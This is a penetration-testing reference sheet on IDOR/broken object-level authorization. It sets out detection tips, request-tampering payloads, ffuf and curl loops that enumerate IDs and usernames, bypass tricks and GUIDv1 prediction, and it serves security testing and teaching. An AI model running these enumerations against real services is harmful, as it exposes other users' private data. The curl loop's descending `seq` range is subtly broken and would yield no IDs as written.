# IDOR (Insecure Direct Object Reference)

> **Summary**: IDOR / Broken Object Level Authorization (BOLA) occurs when an application exposes a user-controllable identifier that directly references an internal object without verifying the caller is authorized to access it.
> **Impact**: Horizontal privilege escalation (access other users' data), vertical privilege escalation (access admin resources), mass data exfiltration, account takeover.
> **Typical Severity**: High | Critical

## Detection

### Indicators
- **Sequential numeric IDs** in API endpoints: `/api/user/1234`, `/api/order/5678`
- **GUIDs/UUIDs** in requests: `/files/550e8400-e29b-41d4-a716-446655440000`
- **Encoded/hashed references**: Base64 or hex-encoded IDs in parameters
- Parameters referencing objects: `?id=42`, `?user_id=321`, `?invoice=2024-00001`
- Object references in request body: `{"user_id": 321, "order_id": 987}`
- Object references in headers/cookies: `X-Client-ID: 4711`
- Endpoints that read, update, or delete data: `GET`, `PUT`, `PATCH`, `DELETE`

### Automated Detection

#### Burp Suite Filter for ID Parameters
```
(?i)\b\w*id\b(?!\w)\s*=\s*("[^"]*"|'[^']*'|[^&\s}]*)
```

Use **Autorize** (Burp extension) to automatically test authorization on every request by replaying with a low-privilege session.

### Manual Detection
1. Identify all parameters that reference objects (IDs, UUIDs, filenames, slugs)
2. Use an authenticated low-privilege session and change only the ID while keeping the same token/cookie
3. If your ID is `64185742`, try `64185741` -- if it returns data, it is likely vulnerable
4. Check the response: absence of an authorization error (403/401) indicates IDOR
5. Look for hidden or alternate flows (e.g., legacy API endpoints, different content types)

## Exploitation

### Prerequisites
- Two accounts with different privilege levels (or at least two regular accounts)
- Identified object references in API requests
- A proxy tool to intercept and modify requests

### Step-by-Step
1. **Map all endpoints** that accept object identifiers
2. **Capture a legitimate request** with your own ID
3. **Swap the ID** to another user's ID (decrement/increment for sequential, use known IDs for UUIDs)
4. **Compare responses**: if you receive data belonging to another user, IDOR confirmed
5. **Test all HTTP methods**: a GET may be protected but PUT/DELETE may not
6. **Test across object types**: user profiles, orders, invoices, files, messages
7. **Automate enumeration** with Burp Intruder or scripting for large-scale testing

### Payloads

#### Add Parameters to Endpoints
```
GET /api_v1/messages --> 401
GET /api_v1/messages?user_id=victim_uuid --> 200
```

#### HTTP Parameter Pollution
```
GET /api_v1/messages?user_id=VICTIM_ID --> 401 Unauthorized
GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID --> 200 OK
GET /api_v1/messages?user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]
```

#### JSON Parameter Pollution
```
POST /api/get_profile
Content-Type: application/json
{"user_id":<legit_id>,"user_id":<victim_id>}
```

#### Add .json Extension (Ruby Applications)
```
/user_data/2341 --> 401 Unauthorized
/user_data/2341.json --> 200 OK
```

#### Test Outdated API Versions
```
/v3/users_data/1234 --> 403 Forbidden
/v1/users_data/1234 --> 200 OK
```

#### Wrap ID in Array
```
{"id":111} --> 401 Unauthorized
{"id":[111]} --> 200 OK
```

#### Wrap ID in JSON Object
```
{"id":111} --> 401 Unauthorized
{"id":{"id":111}} --> 200 OK
```

#### Missing Function Level Access Control
```
GET /admin/profile -> 401
GET /ADMIN/profile -> 200
```

#### Wildcard and Special Values
- Send `*` instead of an ID
- Try `0`, `-1`, `99999999` as boundary values
- If endpoint has `/api/users/myinfo`, check `/api/admin/myinfo`
- Swap GUID with numeric ID or email
- Try obvious GUIDs: `00000000-0000-0000-0000-000000000000`

#### Enumerate Predictable Download IDs (ffuf)
```bash
ffuf -u http://target.com/download.php?id=FUZZ \
  -H "Cookie: PHPSESSID=<session>" \
  -w <(seq 0 6000) \
  -fr 'File Not Found' \
  -o hits.json
jq -r '.results[].url' hits.json
```

#### Error-Response Oracle for User Enumeration
```bash
# Different error messages reveal valid usernames
ffuf -u 'http://target/view.php?username=FUZZ&file=test.doc' \
  -b 'PHPSESSID=<session-cookie>' \
  -w /opt/SecLists/Usernames/Names/names.txt \
  -fr 'User not found'
```

### Proof of Concept

#### Automated Enumeration
```bash
for id in $(seq 64185742 64185700); do
  curl -s -X PUT 'https://target.com/api/lead/cem-xhr' \
       -H 'Content-Type: application/json' \
       -H "Cookie: auth=$TOKEN" \
       -d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id";
done
```

#### IDOR in GraphQL
```graphql
# Change the user ID in a GraphQL query
query {
  user(id: "victim-id-here") {
    email
    name
    phone
    address
  }
}
```

#### IDOR in File References
```
# Direct file access via predictable names
GET /uploads/user_1234/document.pdf --> own file
GET /uploads/user_1235/document.pdf --> other user's file

# File download via parameter
GET /download?file=report_1234.pdf --> own report
GET /download?file=report_1235.pdf --> other user's report
```

## Bypasses
- **Different HTTP methods**: `GET` returns 403 but `PUT`, `POST`, `DELETE`, or `PATCH` returns 200
- **Add .json extension**: works especially on Ruby on Rails applications
- **Wrap ID in array**: `{"id":[111]}` instead of `{"id":111}`
- **Wrap ID in nested object**: `{"id":{"id":111}}`
- **Change Content-Type**: switch between `application/json`, `application/xml`, `application/x-www-form-urlencoded`
- **Numeric vs string ID swapping**: try `"111"` instead of `111` or vice versa
- **Encode/hash the ID**: Base64 encode, URL encode, or MD5 hash the ID value
- **Swap GUID with numeric ID**: if UUID is expected, try a plain integer
- **Swap GUID with email**: some endpoints accept email as an alternative identifier
- **Try older API versions**: `/v1/` may lack authorization checks added in `/v3/`
- **Case manipulation**: `/admin/profile` vs `/ADMIN/profile` vs `/Admin/Profile`
- **Parameter pollution**: send the ID twice with different values
- **Referer header check**: some endpoints validate based on Referer -- set it appropriately
- **Request method override**: use `X-HTTP-Method-Override: PUT` with a POST request
- **Path traversal in ID**: `../other_user/profile`
- **Encoding as bearer token**: short IDs (even hex-encoded) can be enumerated -- encoding does not add entropy

## Escalation
- Chain with [Account Takeover](../authentication/account-takeover.md): steal session tokens or password reset links via IDOR
- **Horizontal escalation**: access other users' profiles, messages, files, orders
- **Vertical escalation**: access admin-only endpoints by guessing admin user IDs
- **Mass data exfiltration**: enumerate sequential IDs to dump entire databases
- Chain with **CSRF**: modify other users' data if write-based IDOR is found
- Chain with **Information Disclosure**: leaked UUIDs from other endpoints can fuel IDOR attacks

## GUID / UUID Exploitation

GUIDv1 tokens are time-based and can be predicted or reversed:
- If you obtain one GUIDv1, you can estimate the timestamp and MAC address components to generate adjacent GUIDs
- Try obvious GUIDs: `00000000-0000-0000-0000-000000000000`, `11111111-1111-1111-1111-111111111111`

## Tools

| Tool | Usage |
|------|-------|
| [Autorize](https://github.com/PortSwigger/autorize) | Burp extension: automatically tests authorization by replaying requests with a low-privilege session |
| [AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix) | Burp extension: authorization testing matrix for multi-role applications |
| [guidtool](https://github.com/intruder-io/guidtool) | Decode and generate GUIDv1 tokens for IDOR exploitation |
| [uuidv1gen](https://github.com/felipecaon/uuidv1gen) | Generate UUIDv1 values based on known timestamps |
| Burp Intruder | Enumerate IDs with sequential numeric or custom payloads |
| Burp Turbo Intruder | High-speed ID enumeration for large ranges |
| [ffuf](https://github.com/ffuf/ffuf) | Fast web fuzzer for ID enumeration with filtering |
| Auto Repeater (Burp) | Automatically repeat requests with modified parameters |

## References
- [OWASP Top 10 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP API Security - BOLA](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [How to Find More IDORs - Vickie Li](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
- [PortSwigger - Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [Bug Bounty Bootcamp - IDOR Chapter](https://nostarch.com/bug-bounty-bootcamp)
